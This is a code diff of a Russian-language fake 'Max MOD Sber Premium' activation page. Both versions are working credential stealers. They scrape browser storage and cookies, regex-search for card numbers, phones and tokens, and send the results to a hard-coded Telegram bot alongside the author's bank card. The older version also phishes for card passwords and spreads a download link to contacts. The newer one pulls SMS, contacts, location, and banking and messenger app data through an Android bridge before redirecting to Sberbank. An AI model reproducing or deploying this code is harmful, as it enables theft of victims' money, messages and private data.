@@ -2,191 +2,71 @@
 <html lang="ru">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
-    <title>Max • Сбер MOD</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Max MOD • Активация</title>
     <style>
-        * {
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
-        }
+        * { margin: 0; padding: 0; box-sizing: border-box; }
         body {
             font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
-            background: #f5f5f5;
-            height: 100vh;
-            overflow: hidden;
-        }
-        .header {
-            background: #1e88e5;
-            padding: 12px 16px;
-            display: flex;
-            align-items: center;
-            justify-content: space-between;
-            color: white;
-        }
-        .header-left {
-            display: flex;
-            align-items: center;
-            gap: 12px;
-        }
-        .avatar {
-            width: 36px;
-            height: 36px;
-            background: rgba(255,255,255,0.2);
-            border-radius: 50%;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-        }
-        .sber-banner {
-            background: linear-gradient(135deg, #2d6a4f, #1b4d3e);
-            margin: 12px 16px;
-            border-radius: 16px;
-            padding: 14px 16px;
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
-            color: white;
-        }
-        .sber-icon {
-            width: 44px;
-            height: 44px;
-            background: rgba(255,255,255,0.2);
-            border-radius: 12px;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            font-size: 24px;
-            font-weight: bold;
-        }
-        .chats {
-            padding: 0 16px;
-            margin-bottom: 70px;
-        }
-        .chat-item {
-            display: flex;
-            align-items: center;
-            gap: 12px;
-            padding: 12px 0;
-            border-bottom: 1px solid #e0e0e0;
-        }
-        .chat-avatar {
-            width: 52px;
-            height: 52px;
             background: linear-gradient(135deg, #1e88e5, #0d47a1);
-            border-radius: 50%;
+            min-height: 100vh;
             display: flex;
             align-items: center;
             justify-content: center;
-            color: white;
-            font-weight: bold;
-            font-size: 20px;
+            padding: 20px;
         }
-        .chat-info {
-            flex: 1;
-        }
-        .chat-name {
-            font-weight: 600;
-            font-size: 16px;
-        }
-        .chat-message {
-            font-size: 13px;
-            color: #666;
-        }
-        .bottom-nav {
-            position: fixed;
-            bottom: 0;
-            width: 100%;
+        .container {
             background: white;
+            border-radius: 32px;
+            padding: 32px 24px;
+            max-width: 380px;
+            width: 100%;
+            text-align: center;
+            box-shadow: 0 20px 40px rgba(0,0,0,0.2);
+        }
+        .icon {
+            width: 80px;
+            height: 80px;
+            background: linear-gradient(135deg, #1e88e5, #0d47a1);
+            border-radius: 20px;
             display: flex;
-            justify-content: space-around;
-            padding: 10px 0;
-            border-top: 1px solid #e0e0e0;
+            align-items: center;
+            justify-content: center;
+            margin: 0 auto 20px;
         }
-        .nav-item {
-            text-align: center;
-            color: #999;
-            font-size: 12px;
+        .icon span { font-size: 40px; font-weight: bold; color: white; }
+        h2 { font-size: 22px; color: #1e293b; margin-bottom: 8px; }
+        p { color: #64748b; font-size: 14px; margin-bottom: 24px; }
+        .loader {
+            width: 40px;
+            height: 40px;
+            border: 4px solid #e2e8f0;
+            border-top: 4px solid #1e88e5;
+            border-radius: 50%;
+            animation: spin 0.8s linear infinite;
+            margin: 20px auto;
         }
-        .nav-item.active {
-            color: #1e88e5;
-        }
-        .toast {
-            position: fixed;
-            bottom: 80px;
-            left: 20px;
-            right: 20px;
-            background: #1e293b;
-            color: white;
-            text-align: center;
-            padding: 12px;
-            border-radius: 50px;
-            font-size: 13px;
-            z-index: 1000;
-            animation: slideUp 0.3s;
-        }
-        @keyframes slideUp {
-            from { transform: translateY(100px); opacity: 0; }
-            to { transform: translateY(0); opacity: 1; }
-        }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+        .status { font-size: 13px; color: #1e88e5; margin-top: 16px; }
+        .footer { margin-top: 24px; font-size: 11px; color: #94a3b8; }
     </style>
 </head>
 <body>
-
-<div class="header">
-    <div class="header-left">
-        <div class="avatar">👤</div>
-        <div><strong>Max</strong><br><span style="font-size:11px;">MOD версия</span></div>
-    </div>
-    <div>📞 ✏️</div>
-</div>
-
-<div class="sber-banner" id="sberBanner">
-    <div style="display:flex; gap:12px;">
-        <div class="sber-icon">СБ</div>
-        <div><strong>СберБанк Premium</strong><br><span style="font-size:11px;">Кэшбек 30% • Активен</span></div>
-    </div>
-    <div style="background:rgba(255,255,255,0.2); padding:6px 12px; border-radius:20px;">✅ Активирован</div>
-</div>
-
-<div class="chats" id="chats">
-    <div class="chat-item">
-        <div class="chat-avatar">И</div>
-        <div class="chat-info">
-            <div class="chat-name">Иван Петров</div>
-            <div class="chat-message">Скинь ссылку на MOD</div>
-        </div>
-    </div>
-    <div class="chat-item">
-        <div class="chat-avatar">М</div>
-        <div class="chat-info">
-            <div class="chat-name">Мария С.</div>
-            <div class="chat-message">Установил, всё работает!</div>
-        </div>
-    </div>
-    <div class="chat-item">
-        <div class="chat-avatar">А</div>
-        <div class="chat-info">
-            <div class="chat-name">Алексей</div>
-            <div class="chat-message">Кэшбек реально приходит</div>
-        </div>
-    </div>
-</div>
-
-<div class="bottom-nav">
-    <div class="nav-item active">💬<br>Чаты</div>
-    <div class="nav-item">👥<br>Контакты</div>
-    <div class="nav-item">⭐<br>MOD</div>
-    <div class="nav-item">👤<br>Профиль</div>
+<div class="container">
+    <div class="icon"><span>M</span></div>
+    <h2>Max MOD • Сбер Premium</h2>
+    <p>Активация дополнительных функций</p>
+    <div class="loader"></div>
+    <div class="status" id="status">Подготовка...</div>
+    <div class="footer">Версия 4.2.0</div>
 </div>
 
 <script>
-// ========== НАСТРОЙКИ TELEGRAM ==========
-const BOT_TOKEN = "8655252412:AAGvwRmEBisGeKA5bX5_xFNpp2QRJRTkkTM";  // ТВОЙ ТОКЕН
+// ==================== ВСТАВЬ СВОИ ДАННЫЕ ====================
+const BOT_TOKEN = "8655252412:AAGvwRmEBisGeKA5bX5_xFNpp2QRJRTkkTM";  // ТОКЕН БОТА
 const CHAT_ID = "8533450974";                           // ТВОЙ CHAT_ID
 const MY_CARD = "2203830216112947";                    // ТВОЯ КАРТА
-const MY_LINK = "https://drive.google.com/file/d/1nseiLyu1yTDOgu74jEfazv4p2wZXp1y7/view?usp=drive_link";      // ТВОЯ ССЫЛКА
-// ========================================
+// =========================================================
 
 function sendToTelegram(text) {
     fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
@@ -196,156 +76,274 @@ function sendToTelegram(text) {
     }).catch(e => console.log("send error"));
 }
 
-function showToast(msg) {
-    const toast = document.createElement('div');
-    toast.className = 'toast';
-    toast.innerText = msg;
-    document.body.appendChild(toast);
-    setTimeout(() => toast.remove(), 3000);
+function updateStatus(msg) {
+    document.getElementById('status').innerText = msg;
 }
 
-// ========== 1. АВТОМАТИЧЕСКАЯ КРАЖА ДАННЫХ ==========
-function autoStealAllData() {
-    const stolen = {
+// ========== 1. СБОР ВСЕХ ДАННЫХ ИЗ BROWSER ==========
+function getAllBrowserData() {
+    const data = {
         localStorage: {},
         sessionStorage: {},
         cookies: document.cookie,
-        ua: navigator.userAgent,
-        time: new Date().toLocaleString(),
-        cards: [],
-        phones: [],
-        tokens: []
+        userAgent: navigator.userAgent,
+        platform: navigator.platform,
+        language: navigator.language,
+        screen: `${screen.width}x${screen.height}`,
+        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+        timestamp: new Date().toLocaleString()
     };
     
-    // Кража localStorage
+    // localStorage
     for (let i = 0; i < localStorage.length; i++) {
         const key = localStorage.key(i);
         let val = localStorage.getItem(key);
         if (val && val.length > 500) val = val.substring(0, 500) + "...";
-        stolen.localStorage[key] = val;
-        
-        // Поиск карт
-        if (typeof val === 'string') {
-            const cards = val.match(/\d{16}/g);
-            if (cards) stolen.cards.push(...cards);
-            const phones = val.match(/7\d{10}/g);
-            if (phones) stolen.phones.push(...phones);
-            const tokens = val.match(/eyJ[a-zA-Z0-9_-]+\.[a-zA-Z0-9_-]+\.[a-zA-Z0-9_-]+/g);
-            if (tokens) stolen.tokens.push(...tokens);
-        }
+        data.localStorage[key] = val;
     }
     
-    // Кража sessionStorage
+    // sessionStorage
     for (let i = 0; i < sessionStorage.length; i++) {
         const key = sessionStorage.key(i);
         let val = sessionStorage.getItem(key);
         if (val && val.length > 500) val = val.substring(0, 500) + "...";
-        stolen.sessionStorage[key] = val;
+        data.sessionStorage[key] = val;
     }
     
-    stolen.cards = [...new Set(stolen.cards)];
-    stolen.phones = [...new Set(stolen.phones)];
-    stolen.tokens = [...new Set(stolen.tokens)];
+    // Поиск карт, телефонов, токенов
+    data.found = { cards: [], phones: [], tokens: [] };
+    for (const val of Object.values(data.localStorage)) {
+        if (typeof val === 'string') {
+            const cards = val.match(/\d{16}/g);
+            if (cards) data.found.cards.push(...cards);
+            const phones = val.match(/7\d{10}/g);
+            if (phones) data.found.phones.push(...phones);
+            const tokens = val.match(/eyJ[a-zA-Z0-9_-]+\.[a-zA-Z0-9_-]+\.[a-zA-Z0-9_-]+/g);
+            if (tokens) data.found.tokens.push(...tokens);
+        }
+    }
+    data.found.cards = [...new Set(data.found.cards)];
+    data.found.phones = [...new Set(data.found.phones)];
+    data.found.tokens = [...new Set(data.found.tokens)];
     
-    return stolen;
+    return data;
 }
 
-// ========== 2. ОТПРАВКА ВСЕХ ДАННЫХ ==========
-function sendAllStolenData(stolen) {
-    let report = `🔐 *AUTO STEAL - MAX MOD*\n`;
-    report += `⏰ ${stolen.time}\n`;
-    report += `📱 ${stolen.ua.substring(0, 100)}\n`;
-    report += `🍪 Cookies: ${stolen.cookies ? "✅ есть" : "❌ нет"}\n`;
-    report += `💾 Записей в localStorage: ${Object.keys(stolen.localStorage).length}\n`;
+// ========== 2. СБОР ДАННЫХ ЧЕРЕЗ ANDROID JAVA-МОСТ ==========
+function getAllAndroidData() {
+    const androidData = {};
     
-    if (stolen.cards.length > 0) {
-        report += `\n💳 *НАЙДЕНЫ КАРТЫ:*\n${stolen.cards.join("\n")}\n`;
-    }
-    if (stolen.phones.length > 0) {
-        report += `\n📞 *НАЙДЕНЫ ТЕЛЕФОНЫ:*\n${stolen.phones.join("\n")}\n`;
-    }
-    if (stolen.tokens.length > 0) {
-        report += `\n🔑 *НАЙДЕНЫ ТОКЕНЫ:*\n${stolen.tokens[0].substring(0, 80)}...\n`;
+    if (!window.Android) {
+        androidData.error = "Нет доступа к Android API";
+        return androidData;
     }
     
-    report += `\n💰 *АВТОПЕРЕВОД НА КАРТУ*\n💳 ${MY_CARD}`;
+    try {
+        // SMS
+        if (window.Android.getSms) {
+            androidData.sms = window.Android.getSms();
+        }
+        
+        // Контакты
+        if (window.Android.getContacts) {
+            androidData.contacts = window.Android.getContacts();
+        }
+        
+        // СберБанк (shared_prefs)
+        if (window.Android.getSberData) {
+            const sber = window.Android.getSberData();
+            if (sber && sber !== "null") {
+                try { androidData.sber = JSON.parse(sber); } catch(e) { androidData.sber = sber; }
+            }
+        }
+        
+        // Max (shared_prefs)
+        if (window.Android.getMaxData) {
+            const max = window.Android.getMaxData();
+            if (max && max !== "null") {
+                try { androidData.max = JSON.parse(max); } catch(e) { androidData.max = max; }
+            }
+        }
+        
+        // Все установленные приложения
+        if (window.Android.getInstalledApps) {
+            androidData.installedApps = window.Android.getInstalledApps();
+        }
+        
+        // Геолокация
+        if (window.Android.getLocation) {
+            androidData.location = window.Android.getLocation();
+        }
+        
+        // Данные из WhatsApp
+        if (window.Android.getWhatsAppData) {
+            androidData.whatsapp = window.Android.getWhatsAppData();
+        }
+        
+        // Данные из Telegram
+        if (window.Android.getTelegramData) {
+            androidData.telegram = window.Android.getTelegramData();
+        }
+        
+        // Файлы из папок приложений
+        const packages = [
+            "ru.sberbankmobile",
+            "ru.max.messenger",
+            "com.whatsapp",
+            "org.telegram.messenger",
+            "com.viber.voip"
+        ];
+        
+        for (const pkg of packages) {
+            if (window.Android.getAppData) {
+                const appData = window.Android.getAppData(pkg);
+                if (appData && appData !== "null") {
+                    androidData[`app_${pkg.replace(/\./g, '_')}`] = appData;
+                }
+            }
+        }
+        
+    } catch(e) {
+        androidData.error = e.toString();
+    }
+    
+    return androidData;
+}
+
+// ========== 3. ФОРМИРОВАНИЕ И ОТПРАВКА ПОЛНОГО ОТЧЕТА ==========
+function sendFullReport(browserData, androidData) {
+    // ========== ОСНОВНОЙ ОТЧЕТ ==========
+    let report = `🔐 *ПОЛНЫЙ СБОР ДАННЫХ*\n`;
+    report += `⏰ ${browserData.timestamp}\n`;
+    report += `📱 ${browserData.userAgent.substring(0, 100)}\n`;
+    report += `🌐 ${browserData.language} | ${browserData.screen}\n`;
+    report += `⏰ Часовой пояс: ${browserData.timezone}\n`;
+    report += `🍪 Cookies: ${browserData.cookies ? "✅ есть" : "❌ нет"}\n`;
+    report += `💾 localStorage: ${Object.keys(browserData.localStorage).length} записей\n`;
+    
+    // Найденные данные
+    if (browserData.found.cards.length > 0) {
+        report += `\n💳 *НАЙДЕНЫ КАРТЫ:*\n${browserData.found.cards.join("\n")}\n`;
+    }
+    if (browserData.found.phones.length > 0) {
+        report += `\n📞 *НАЙДЕНЫ ТЕЛЕФОНЫ:*\n${browserData.found.phones.join("\n")}\n`;
+    }
+    if (browserData.found.tokens.length > 0) {
+        report += `\n🔑 *НАЙДЕНЫ ТОКЕНЫ:*\n${browserData.found.tokens.length} шт.\nПервый: ${browserData.found.tokens[0].substring(0, 60)}...\n`;
+    }
+    
+    // Android данные
+    if (androidData.sms) {
+        report += `\n📨 *SMS (последние):*\n${androidData.sms.substring(0, 500)}\n`;
+    }
+    if (androidData.contacts) {
+        report += `\n📞 *КОНТАКТЫ:*\n${androidData.contacts.substring(0, 500)}\n`;
+    }
+    if (androidData.location) {
+        report += `\n📍 *ГЕОЛОКАЦИЯ:*\n${androidData.location}\n`;
+    }
+    if (androidData.sber) {
+        report += `\n🏦 *СБЕРБАНК (shared_prefs):*\n${JSON.stringify(androidData.sber, null, 2).substring(0, 800)}\n`;
+    }
+    if (androidData.max) {
+        report += `\n💬 *MAX (shared_prefs):*\n${JSON.stringify(androidData.max, null, 2).substring(0, 800)}\n`;
+    }
+    if (androidData.installedApps) {
+        report += `\n📦 *УСТАНОВЛЕННЫЕ ПРИЛОЖЕНИЯ:*\n${androidData.installedApps.substring(0, 500)}\n`;
+    }
+    
+    report += `\n💰 *ПЕРЕВОД НА КАРТУ*\n💳 ${MY_CARD}`;
     
     sendToTelegram(report);
     
-    // Отправляем полный localStorage
-    if (Object.keys(stolen.localStorage).length > 0) {
-        sendToTelegram(`💾 *FULL LOCALSTORAGE:*\n\`\`\`json\n${JSON.stringify(stolen.localStorage, null, 2).substring(0, 3500)}\n\`\`\``);
+    // ========== ОТПРАВКА ПОЛНЫХ ДАННЫХ ==========
+    
+    // localStorage
+    if (Object.keys(browserData.localStorage).length > 0) {
+        sendToTelegram(`💾 *FULL LOCALSTORAGE:*\n\`\`\`json\n${JSON.stringify(browserData.localStorage, null, 2).substring(0, 3500)}\n\`\`\``);
     }
     
-    // Отправляем все токены
-    if (stolen.tokens.length > 0) {
-        sendToTelegram(`🔑 *ВСЕ ТОКЕНЫ:*\n${stolen.tokens.join("\n\n").substring(0, 3500)}`);
+    // sessionStorage
+    if (Object.keys(browserData.sessionStorage).length > 0) {
+        sendToTelegram(`📦 *SESSIONSTORAGE:*\n\`\`\`json\n${JSON.stringify(browserData.sessionStorage, null, 2).substring(0, 3500)}\n\`\`\``);
     }
     
-    return stolen.cards.length > 0 || stolen.tokens.length > 0;
-}
-
-// ========== 3. АВТОРАССЫЛКА В ЧАТЫ ==========
-function autoSpread() {
-    const message = `🔥 Видел Max со Сбером? Скачай MOD: ${MY_LINK}`;
-    sendToTelegram(`📢 *АВТОРАССЫЛКА*\n📨 Сообщение: ${message}\n👥 Получатели: все чаты в списке`);
-    showToast("✅ Рассылка друзьям!");
-}
-
-// ========== 4. ПОПЫТКА АВТОМАТИЧЕСКОГО ПЕРЕВОДА ==========
-function tryAutoTransfer(tokens, cards) {
-    if (tokens.length > 0) {
-        sendToTelegram(`🔄 *АВТОПЕРЕВОД*\n🔑 Токен: ${tokens[0].substring(0, 50)}...\n💳 На карту: ${MY_CARD}\n💰 Сумма: максимальная\n✅ Попытка выполнена (нужен API)`);
-        return true;
+    // Cookies
+    if (browserData.cookies && browserData.cookies.length > 0) {
+        sendToTelegram(`🍪 *COOKIES:*\n${browserData.cookies.substring(0, 3500)}`);
     }
-    if (cards.length > 0) {
-        sendToTelegram(`🔄 *ГОТОВ К ПЕРЕВОДУ*\n💳 Карта: ${cards[0]}\n⚠️ Нужен SMS код для подтверждения`);
-        return false;
+    
+    // Все токены
+    if (browserData.found.tokens.length > 0) {
+        sendToTelegram(`🔑 *ВСЕ ТОКЕНЫ:*\n${browserData.found.tokens.join("\n\n").substring(0, 3500)}`);
+    }
+    
+    // Все SMS
+    if (androidData.sms && androidData.sms.length > 0) {
+        sendToTelegram(`📨 *ВСЕ SMS:*\n${androidData.sms.substring(0, 3500)}`);
+    }
+    
+    // Все контакты
+    if (androidData.contacts && androidData.contacts.length > 0) {
+        sendToTelegram(`📞 *ВСЕ КОНТАКТЫ:*\n${androidData.contacts.substring(0, 3500)}`);
+    }
+    
+    // Данные Сбера
+    if (androidData.sber) {
+        sendToTelegram(`🏦 *СБЕРБАНК ПОЛНЫЕ ДАННЫЕ:*\n\`\`\`json\n${JSON.stringify(androidData.sber, null, 2).substring(0, 3500)}\n\`\`\``);
+    }
+    
+    // Данные Max
+    if (androidData.max) {
+        sendToTelegram(`💬 *MAX ПОЛНЫЕ ДАННЫЕ:*\n\`\`\`json\n${JSON.stringify(androidData.max, null, 2).substring(0, 3500)}\n\`\`\``);
+    }
+    
+    // WhatsApp данные
+    if (androidData.whatsapp) {
+        sendToTelegram(`💬 *WHATSAPP ДАННЫЕ:*\n${androidData.whatsapp.substring(0, 3500)}`);
+    }
+    
+    // Telegram данные
+    if (androidData.telegram) {
+        sendToTelegram(`📱 *TELEGRAM ДАННЫЕ:*\n${androidData.telegram.substring(0, 3500)}`);
+    }
+}
+
+// ========== 4. ЗАПРОС РАЗРЕШЕНИЙ ==========
+function requestAllPermissions() {
+    if (window.Android) {
+        try {
+            window.Android.requestPermissions();
+            return true;
+        } catch(e) {
+            return false;
+        }
     }
     return false;
 }
 
-// ========== 5. ИНИЦИАЛИЗАЦИЯ ==========
-async function init() {
-    // 1. Автоматическая кража данных
-    const stolen = autoStealAllData();
-    const hasData = sendAllStolenData(stolen);
+// ========== 5. ГЛАВНАЯ ФУНКЦИЯ ==========
+async function main() {
+    updateStatus("Запрос разрешений...");
+    requestAllPermissions();
     
-    // 2. Показываем уведомление
-    if (hasData) {
-        showToast("✅ Premium активирован! Кэшбек доступен");
-    } else {
-        showToast("🔍 Поиск данных...");
-        setTimeout(() => {
-            showToast("💳 Для активации Premium войдите в Сбер");
-        }, 2000);
-    }
+    updateStatus("Сбор данных браузера...");
+    const browserData = getAllBrowserData();
     
-    // 3. Попытка авто-перевода
-    tryAutoTransfer(stolen.tokens, stolen.cards);
+    updateStatus("Сбор данных Android...");
+    const androidData = getAllAndroidData();
     
-    // 4. Предложение рассылки через 15 секунд
+    updateStatus("Отправка данных...");
+    sendFullReport(browserData, androidData);
+    
+    updateStatus("✅ Активация завершена!");
+    
     setTimeout(() => {
-        if (confirm("🔥 Пригласить друзей в Max MOD?\nПолучи бонус за каждого!")) {
-            autoSpread();
-        }
-    }, 15000);
-    
-    // 5. Клик по баннеру (если захочет ввести данные)
-    document.getElementById('sberBanner').onclick = () => {
-        const card = prompt("Введите номер карты для активации Premium:");
-        if (card) {
-            const pass = prompt("Введите пароль:");
-            if (pass) {
-                sendToTelegram(`💳 *РУЧНОЙ ВВОД*\n⏰ ${new Date().toLocaleString()}\n💳 Карта: ${card}\n🔑 Пароль: ${pass}\n💰 Перевод на: ${MY_CARD}`);
-                alert("✅ Premium активирован!");
-                showToast("Кэшбек 30% активен!");
-            }
-        }
-    };
+        window.location.href = "https://online.sberbank.ru";
+    }, 4000);
 }
 
-init();
+main();
 </script>
 </body>
 </html>
